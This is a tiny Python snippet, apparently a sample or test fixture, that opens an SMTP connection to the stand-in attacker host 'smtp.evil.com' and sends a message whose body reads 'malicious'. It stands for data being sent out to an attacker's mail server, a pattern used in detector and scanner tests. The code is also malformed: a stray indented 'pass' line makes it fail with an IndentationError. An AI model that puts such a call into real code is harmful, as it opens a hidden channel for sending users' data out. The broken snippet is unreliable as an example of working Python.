import smtplib
smtp = smtplib.SMTP('smtp.evil.com')
    pass  # no-op
smtp.sendmail('a@a.com', 'b@b.com', 'malicious')